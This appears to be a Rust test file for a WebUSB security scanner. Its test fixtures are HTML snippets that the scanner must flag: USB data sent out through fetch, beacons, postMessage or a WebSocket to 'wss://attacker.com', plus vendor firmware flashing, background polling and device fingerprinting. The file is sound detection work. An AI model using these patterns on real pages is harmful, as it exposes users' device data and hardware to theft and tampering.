use crate::webusb_audit::*;

#[test]
fn no_usb_no_issues() {
    assert!(analyze_webusb("<html><body>hello</body></html>").is_empty());
}

#[test]
fn detects_api_navigator() {
    let body = r#"<script>const dev = await navigator.usb.requestDevice({});</script>"#;
    let issues = analyze_webusb(body);
    assert!(issues.contains(&WebUsbIssue::ApiDetected));
}

#[test]
fn detects_api_usb_device() {
    let body = r#"<script>const dev = new USBDevice();</script>"#;
    let issues = analyze_webusb(body);
    assert!(issues.contains(&WebUsbIssue::ApiDetected));
}

#[test]
fn detects_data_exfiltration() {
    let body = r#"<script>
        const dev = await navigator.usb.requestDevice({});
        fetch("/api/usb-data", {body: "data"});
    </script>"#;
    let issues = analyze_webusb(body);
    assert!(issues.contains(&WebUsbIssue::DataExfiltration));
}

#[test]
fn no_exfil_without_fetch() {
    let body = r#"<script>
        const dev = await navigator.usb.requestDevice({});
        console.log(dev);
    </script>"#;
    let issues = analyze_webusb(body);
    assert!(!issues.contains(&WebUsbIssue::DataExfiltration));
}

#[test]
fn detects_no_user_activation() {
    let body = r#"<script>await navigator.usb.requestDevice({});</script>"#;
    let issues = analyze_webusb(body);
    assert!(issues.contains(&WebUsbIssue::NoUserActivation));
}

#[test]
fn no_activation_issue_with_click() {
    let body = r#"<script>
        btn.addEventListener("click", async () => {
            await navigator.usb.requestDevice({});
        });
    </script>"#;
    let issues = analyze_webusb(body);
    assert!(!issues.contains(&WebUsbIssue::NoUserActivation));
}

#[test]
fn detects_bulk_transfer() {
    let body = r#"<script>
        btn.addEventListener("click", async () => {
            const dev = await navigator.usb.requestDevice({});
            await dev.open();
            const result = await dev.transferIn(1, 64);
        });
    </script>"#;
    let issues = analyze_webusb(body);
    assert!(issues.contains(&WebUsbIssue::BulkTransfer));
}

#[test]
fn detects_device_enumeration() {
    let body = r#"<script>
        const devices = await navigator.usb.getDevices();
    </script>"#;
    let issues = analyze_webusb(body);
    assert!(issues.contains(&WebUsbIssue::DeviceEnumeration));
}

#[test]
fn detects_claim_interface() {
    let body = r#"<script>
        btn.addEventListener("click", async () => {
            const dev = await navigator.usb.requestDevice({});
            await dev.open();
            await dev.claimInterface(0);
        });
    </script>"#;
    let issues = analyze_webusb(body);
    assert!(issues.contains(&WebUsbIssue::ClaimInterface));
}

#[test]
fn severity_exfiltration_highest() {
    assert_eq!(webusb_severity(&WebUsbIssue::DataExfiltration), 7.5);
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(webusb_severity(&WebUsbIssue::ApiDetected), 3.0);
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![WebUsbIssue::ApiDetected, WebUsbIssue::BulkTransfer];
    let mut seq = 0;
    let ops = webusb_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(WebUsbIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(
        WebUsbIssue::DataExfiltration.to_string(),
        "data_exfiltration"
    );
    assert_eq!(
        WebUsbIssue::NoUserActivation.to_string(),
        "no_user_activation"
    );
    assert_eq!(WebUsbIssue::BulkTransfer.to_string(), "bulk_transfer");
    assert_eq!(
        WebUsbIssue::DeviceEnumeration.to_string(),
        "device_enumeration"
    );
    assert_eq!(WebUsbIssue::ClaimInterface.to_string(), "claim_interface");
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_webusb("").is_empty());
}

#[test]
fn security_no_usb_no_issues() {
    assert!(analyze_webusb_security("<html><body>hello</body></html>").is_empty());
}

#[test]
fn security_empty_body_no_issues() {
    assert!(analyze_webusb_security("").is_empty());
}

#[test]
fn security_detects_device_enumeration() {
    let body = r#"<script>
        const devices = await navigator.usb.getDevices();
        console.log(devices);
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbDeviceEnumeration));
}

#[test]
fn security_detects_data_exfiltration_fetch() {
    let body = r#"<script>
        const dev = await navigator.usb.requestDevice({});
        await dev.open();
        const result = await dev.transferIn(1, 64);
        fetch("/api/usb", {method: "POST", body: JSON.stringify(result)});
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbDataExfiltration));
}

#[test]
fn security_detects_data_exfiltration_xhr() {
    let body = r#"<script>
        const result = await dev.transferIn(1, 64);
        const xhr = new XMLHttpRequest();
        xhr.open("POST", "/api/usb");
        xhr.send(result.data);
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbDataExfiltration));
}

#[test]
fn security_detects_data_exfiltration_beacon() {
    let body = r#"<script>
        navigator.usb.requestDevice({}).then(async dev => {
            const result = await dev.transferOut(1, data);
            navigator.sendBeacon("/track", result);
        });
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbDataExfiltration));
}

#[test]
fn security_detects_data_exfiltration_websocket() {
    let body = r#"<script>
        const ws = new WebSocket("wss://attacker.com");
        const result = await dev.transferIn(1, 64);
        ws.send(result.data);
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbDataExfiltration));
}

#[test]
fn security_detects_data_exfiltration_postmessage() {
    let body = r#"<script>
        const result = await dev.transferIn(1, 64);
        window.parent.postMessage(result, "*");
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbDataExfiltration));
}

#[test]
fn security_no_exfil_without_transfer() {
    let body = r#"<script>
        const dev = await navigator.usb.requestDevice({});
        fetch("/api/log", {body: "opened"});
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(!issues.contains(&WebUsbSecurityIssue::UsbDataExfiltration));
}

#[test]
fn security_detects_without_permission() {
    let body = r#"<script>
        // USBDevice usage
        const dev = devices[0];
        await dev.open();
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbWithoutPermission));
}

#[test]
fn security_no_permission_issue_with_request() {
    let body = r#"<script>
        const dev = await navigator.usb.requestDevice({filters: []});
        await dev.open();
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(!issues.contains(&WebUsbSecurityIssue::UsbWithoutPermission));
}

#[test]
fn security_no_permission_issue_with_listener() {
    let body = r#"<script>
        btn.addEventListener("click", async () => {
            await dev.open();
        });
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(!issues.contains(&WebUsbSecurityIssue::UsbWithoutPermission));
}

#[test]
fn security_detects_firmware_flash() {
    let body = r#"<script>
        await dev.controlTransferOut({
            requestType: "vendor",
            recipient: "device",
            request: 0xA0,
            value: 0xE600,
            index: 0x0000
        }, firmware);
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbFirmwareFlash));
}

#[test]
fn security_no_firmware_without_hex() {
    let body = r#"<script>
        await dev.controlTransferOut({request: 1}, data);
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(!issues.contains(&WebUsbSecurityIssue::UsbFirmwareFlash));
}

#[test]
fn security_detects_cross_origin() {
    let body = r#"<script>
        const result = await dev.transferIn(1, 64);
        window.parent.postMessage({usb: result}, "*");
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbCrossOrigin));
}

#[test]
fn security_no_cross_origin_without_postmessage() {
    let body = r#"<script>
        const result = await dev.transferIn(1, 64);
        console.log(result);
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(!issues.contains(&WebUsbSecurityIssue::UsbCrossOrigin));
}

#[test]
fn security_detects_bulk_transfer_in() {
    let body = r#"<script>
        const result = await dev.transferIn(1, 64);
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbBulkTransfer));
}

#[test]
fn security_detects_bulk_transfer_out() {
    let body = r#"<script>
        await dev.transferOut(1, data);
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbBulkTransfer));
}

#[test]
fn security_detects_control_transfer_in() {
    let body = r#"<script>
        const result = await dev.controlTransferIn({
            requestType: "standard",
            recipient: "device",
            request: 0x06,
            value: 0x0100,
            index: 0
        }, 64);
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbControlTransfer));
}

#[test]
fn security_detects_control_transfer_out() {
    let body = r#"<script>
        await dev.controlTransferOut({request: 1}, data);
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbControlTransfer));
}

#[test]
fn security_detects_usb_in_background() {
    let body = r#"<script>
        setInterval(async () => {
            const result = await dev.transferIn(1, 64);
            processData(result);
        }, 1000);
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbInBackground));
}

#[test]
fn security_no_background_with_visibility_check() {
    let body = r#"<script>
        document.addEventListener("visibilitychange", () => {
            if (!document.hidden) {
                setInterval(async () => {
                    await dev.transferIn(1, 64);
                }, 1000);
            }
        });
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(!issues.contains(&WebUsbSecurityIssue::UsbInBackground));
}

#[test]
fn security_no_background_with_focus_check() {
    let body = r#"<script>
        window.addEventListener("focus", () => {
            setInterval(async () => {
                await dev.transferIn(1, 64);
            }, 1000);
        });
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(!issues.contains(&WebUsbSecurityIssue::UsbInBackground));
}

#[test]
fn security_detects_device_fingerprinting_productid() {
    let body = r#"<script>
        const dev = await navigator.usb.requestDevice({});
        console.log(dev.productId);
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbDeviceFingerprinting));
}

#[test]
fn security_detects_device_fingerprinting_vendorid() {
    let body = r#"<script>
        const dev = await navigator.usb.requestDevice({});
        const id = dev.vendorId;
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbDeviceFingerprinting));
}

#[test]
fn security_detects_device_fingerprinting_serial() {
    let body = r#"<script>
        const dev = await navigator.usb.requestDevice({});
        const serial = dev.serialNumber;
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbDeviceFingerprinting));
}

#[test]
fn security_detects_persistent_connection() {
    let body = r#"<script>
        const dev = await navigator.usb.requestDevice({});
        localStorage.setItem("usbSerial", dev.serialNumber);
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbPersistentConnection));
}

#[test]
fn security_no_persistent_without_localstorage() {
    let body = r#"<script>
        const dev = await navigator.usb.requestDevice({});
        console.log(dev.serialNumber);
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(!issues.contains(&WebUsbSecurityIssue::UsbPersistentConnection));
}

#[test]
fn security_severity_firmware_highest() {
    assert_eq!(
        webusb_security_severity(&WebUsbSecurityIssue::UsbFirmwareFlash),
        9.5
    );
}

#[test]
fn security_severity_data_exfil_high() {
    assert_eq!(
        webusb_security_severity(&WebUsbSecurityIssue::UsbDataExfiltration),
        8.5
    );
}

#[test]
fn security_severity_without_permission_high() {
    assert_eq!(
        webusb_security_severity(&WebUsbSecurityIssue::UsbWithoutPermission),
        8.0
    );
}

#[test]
fn security_severity_control_transfer_medium_high() {
    assert_eq!(
        webusb_security_severity(&WebUsbSecurityIssue::UsbControlTransfer),
        7.5
    );
}

#[test]
fn security_severity_cross_origin_medium() {
    assert_eq!(
        webusb_security_severity(&WebUsbSecurityIssue::UsbCrossOrigin),
        7.0
    );
}

#[test]
fn security_severity_fingerprinting_lowest() {
    assert_eq!(
        webusb_security_severity(&WebUsbSecurityIssue::UsbDeviceFingerprinting),
        4.5
    );
}

#[test]
fn security_to_operations_creates_entries() {
    let issues = vec![
        WebUsbSecurityIssue::UsbDeviceEnumeration,
        WebUsbSecurityIssue::UsbBulkTransfer,
    ];
    let mut seq = 0;
    let ops = webusb_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn security_to_operations_empty_vector() {
    let issues = vec![];
    let mut seq = 5;
    let ops = webusb_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 0);
    assert_eq!(seq, 5);
}

#[test]
fn security_display_device_enumeration() {
    assert_eq!(
        WebUsbSecurityIssue::UsbDeviceEnumeration.to_string(),
        "usb_device_enumeration"
    );
}

#[test]
fn security_display_data_exfiltration() {
    assert_eq!(
        WebUsbSecurityIssue::UsbDataExfiltration.to_string(),
        "usb_data_exfiltration"
    );
}

#[test]
fn security_display_without_permission() {
    assert_eq!(
        WebUsbSecurityIssue::UsbWithoutPermission.to_string(),
        "usb_without_permission"
    );
}

#[test]
fn security_display_firmware_flash() {
    assert_eq!(
        WebUsbSecurityIssue::UsbFirmwareFlash.to_string(),
        "usb_firmware_flash"
    );
}

#[test]
fn security_display_cross_origin() {
    assert_eq!(
        WebUsbSecurityIssue::UsbCrossOrigin.to_string(),
        "usb_cross_origin"
    );
}

#[test]
fn security_display_bulk_transfer() {
    assert_eq!(
        WebUsbSecurityIssue::UsbBulkTransfer.to_string(),
        "usb_bulk_transfer"
    );
}

#[test]
fn security_display_control_transfer() {
    assert_eq!(
        WebUsbSecurityIssue::UsbControlTransfer.to_string(),
        "usb_control_transfer"
    );
}

#[test]
fn security_display_in_background() {
    assert_eq!(
        WebUsbSecurityIssue::UsbInBackground.to_string(),
        "usb_in_background"
    );
}

#[test]
fn security_display_device_fingerprinting() {
    assert_eq!(
        WebUsbSecurityIssue::UsbDeviceFingerprinting.to_string(),
        "usb_device_fingerprinting"
    );
}

#[test]
fn security_display_persistent_connection() {
    assert_eq!(
        WebUsbSecurityIssue::UsbPersistentConnection.to_string(),
        "usb_persistent_connection"
    );
}

#[test]
fn security_multiple_issues_detected() {
    let body = r#"<script>
        const devices = await navigator.usb.getDevices();
        const dev = devices[0];
        await dev.open();
        const result = await dev.transferIn(1, 64);
        fetch("/api/usb", {body: result});
        console.log(dev.productId);
    </script>"#;
    let issues = analyze_webusb_security(body);
    assert!(issues.len() >= 4);
    assert!(issues.contains(&WebUsbSecurityIssue::UsbDeviceEnumeration));
    assert!(issues.contains(&WebUsbSecurityIssue::UsbDataExfiltration));
    assert!(issues.contains(&WebUsbSecurityIssue::UsbBulkTransfer));
    assert!(issues.contains(&WebUsbSecurityIssue::UsbDeviceFingerprinting));
}
